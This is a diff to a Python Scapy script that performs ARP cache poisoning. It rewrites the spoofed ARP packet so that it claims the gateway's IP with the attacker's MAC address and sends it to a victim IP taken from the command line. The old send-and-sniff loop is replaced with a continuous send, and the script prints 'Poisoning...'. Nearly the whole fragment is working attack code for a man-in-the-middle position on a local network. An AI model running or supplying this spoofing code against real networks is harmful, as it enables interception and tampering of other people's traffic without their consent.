@@ -34,9 +34,14 @@ print "[*] Gateway IP : ", gateIP
 
 victimIP = sys.argv[1]
 broadIP = ifIP.replace("."+ifIP.split(',')[-1], '')+".255"
-packet = Ether()/ARP(op="who-has",hwsrc=ifMAC,psrc=gateIP,pdst=victimIP)
+#packet = Ether()/ARP(op="who-has",hwsrc=ifMAC,psrc=gateIP,pdst=victimIP)
+h=ARP()
+h.psrc=(gateIP)
+h.pdst=(victimIP)
+print ifMAC
+h.hwsrc=(ifMAC)
+h.show()
 print "[*] Poisoning..."
-while True:
-	sendp(packet, verbose=0)
-	sniff(prn=filt, stop_filter=stopfilt)
+send(h, verbose=0, inter=1, loop=1)
+#sniff(prn=filt, stop_filter=stopfilt)
 	
